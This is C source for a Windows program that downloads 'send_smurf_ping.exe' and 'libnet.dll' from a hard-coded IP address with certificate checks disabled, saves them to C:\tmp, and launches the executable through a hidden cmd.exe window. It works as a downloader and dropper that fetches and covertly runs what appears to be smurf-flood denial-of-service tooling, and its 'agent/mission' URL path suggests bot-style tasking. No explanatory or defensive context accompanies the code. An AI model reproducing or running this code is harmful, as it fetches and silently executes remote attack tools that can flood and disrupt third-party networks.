#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif

#include <tchar.h>
#include <windows.h>
#define CURL_STATICLIB
#include <direct.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
// curl-7.40.0-devel-mingw32
#include <curl/curl.h>
#define POST_SIZE 2048
int mkdir(const char *);
char filename[FILENAME_MAX] = "C:\\tmp\\send_smurf_ping.exe";
char filename2[FILENAME_MAX] = "C:\\tmp\\libnet.dll";
size_t callback_file(void *, size_t , size_t , FILE *);



int WINAPI WinMain (HINSTANCE hThisInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpszArgument,
                     int nCmdShow)
{
    char *url = "https://120.125.80.141/opgs/agent/mission/send_smurf_ping.exe";
    char *url2 = "https://120.125.80.141/opgs/agent/mission/libnet.dll";
    char agent[] = "opgs/1.1";
    FILE *fp;
    _mkdir("C:\\tmp");

    CURL *curl;
    fp = fopen(filename,"wb");
    curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, agent);
    curl_easy_setopt(curl, CURLOPT_HEADER, 0L);
    curl_easy_setopt(curl, CURLOPT_POST,1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback_file);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_perform(curl);
    fclose(fp);

    fp = fopen(filename2,"wb");
    curl_easy_setopt(curl, CURLOPT_URL, url2);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback_file);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_perform(curl);
    fclose(fp);
    curl_easy_cleanup(curl);

    SHELLEXECUTEINFO ShExecInfo = {0};
    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo.hwnd = NULL;
    ShExecInfo.lpVerb = NULL;
    ShExecInfo.lpFile = "cmd.exe";
    ShExecInfo.lpParameters = "/c start C:\\tmp\\send_smurf_ping.exe";
    ShExecInfo.lpDirectory = NULL;
    ShExecInfo.nShow = SW_HIDE;
    ShExecInfo.hInstApp = NULL;
    ShellExecuteEx(&ShExecInfo);
    WaitForSingleObject(ShExecInfo.hProcess,INFINITE);
    exit(1);
}

size_t callback_file(void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}


